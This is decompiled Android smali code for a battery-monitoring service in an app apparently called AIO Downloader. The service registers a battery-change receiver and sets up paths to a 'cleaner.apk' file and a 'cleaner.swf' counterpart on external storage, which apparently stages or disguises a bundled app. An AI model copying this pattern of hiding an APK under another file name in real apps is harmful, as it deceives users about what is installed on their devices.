.class public Lcom/aio/downloader/service/BatteryInfoService1;
.super Landroid/app/Service;
.source "BatteryInfoService1.java"


# static fields
.field private static final BATTERY_ID:I = 0x1


# instance fields
.field private PRO_DIR:Ljava/io/File;

.field private PRO_DIR_FOME:Ljava/io/File;

.field private PRO_DIR_TO:Ljava/io/File;

.field private activity:Landroid/app/Activity;

.field private author:I

.field private battery:[I

.field private context:Landroid/content/Context;

.field private myBatteryReceiver:Landroid/content/BroadcastReceiver;

.field private show:I


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 36
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 39
    const/16 v0, 0x31

    new-array v0, v0, [I

    fill-array-data v0, :array_0

    .line 42
    iput-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->battery:[I

    .line 47
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    .line 48
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/cleaner/cleaner.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR_FOME:Ljava/io/File;

    .line 49
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    .line 50
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/cleaner/cleaner.swf"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR_TO:Ljava/io/File;

    .line 51
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    .line 52
    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/cleaner"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR:Ljava/io/File;

    .line 76
    new-instance v0, Lcom/aio/downloader/service/BatteryInfoService1$1;

    invoke-direct {v0, p0}, Lcom/aio/downloader/service/BatteryInfoService1$1;-><init>(Lcom/aio/downloader/service/BatteryInfoService1;)V

    iput-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->myBatteryReceiver:Landroid/content/BroadcastReceiver;

    .line 36
    return-void

    .line 39
    :array_0
    .array-data 4
        0x62
        0x60
        0x5e
        0x5c
        0x5a
        0x58
        0x56
        0x54
        0x52
        0x50
        0x4e
        0x4c
        0x4a
        0x48
        0x46
        0x44
        0x42
        0x40
        0x3e
        0x3c
        0x3a
        0x38
        0x36
        0x34
        0x32
        0x30
        0x2e
        0x2c
        0x2a
        0x28
        0x26
        0x24
        0x22
        0x20
        0x1e
        0x1c
        0x1a
        0x18
        0x16
        0x14
        0x12
        0x10
        0xe
        0xc
        0xa
        0x8
        0x6
        0x4
        0x2
    .end array-data
.end method

.method static synthetic access$0(Lcom/aio/downloader/service/BatteryInfoService1;)I
    .locals 1

    .prologue
    .line 45
    iget v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->author:I

    return v0
.end method

.method static synthetic access$1(Lcom/aio/downloader/service/BatteryInfoService1;I)V
    .locals 0

    .prologue
    .line 45
    iput p1, p0, Lcom/aio/downloader/service/BatteryInfoService1;->author:I

    return-void
.end method

.method static synthetic access$2(Lcom/aio/downloader/service/BatteryInfoService1;)Ljava/io/File;
    .locals 1

    .prologue
    .line 47
    iget-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR_FOME:Ljava/io/File;

    return-object v0
.end method

.method static synthetic access$3(Lcom/aio/downloader/service/BatteryInfoService1;)Ljava/io/File;
    .locals 1

    .prologue
    .line 51
    iget-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR:Ljava/io/File;

    return-object v0
.end method

.method static synthetic access$4(Lcom/aio/downloader/service/BatteryInfoService1;)Ljava/io/File;
    .locals 1

    .prologue
    .line 49
    iget-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->PRO_DIR_TO:Ljava/io/File;

    return-object v0
.end method


# virtual methods
.method public getFileSizes(Ljava/io/File;)J
    .locals 4
    .param p1, "f"    # Ljava/io/File;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 271
    const-wide/16 v1, 0x0

    .line 272
    .local v1, "s":J
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 273
    const/4 v0, 0x0

    .line 274
    .local v0, "fis":Ljava/io/FileInputStream;
    new-instance v0, Ljava/io/FileInputStream;

    .end local v0    # "fis":Ljava/io/FileInputStream;
    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 275
    .restart local v0    # "fis":Ljava/io/FileInputStream;
    invoke-virtual {v0}, Ljava/io/FileInputStream;->available()I

    move-result v3

    int-to-long v1, v3

    .line 279
    .end local v0    # "fis":Ljava/io/FileInputStream;
    :goto_0
    return-wide v1

    .line 277
    :cond_0
    invoke-virtual {p1}, Ljava/io/File;->createNewFile()Z

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 57
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "ShowToast"
        }
    .end annotation

    .prologue
    .line 64
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 66
    iget-object v0, p0, Lcom/aio/downloader/service/BatteryInfoService1;->myBatteryReceiver:Landroid/content/BroadcastReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    .line 67
    const-string v2, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 66
    invoke-virtual {p0, v0, v1}, Lcom/aio/downloader/service/BatteryInfoService1;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 68
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 73
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 74
    return-void
.end method
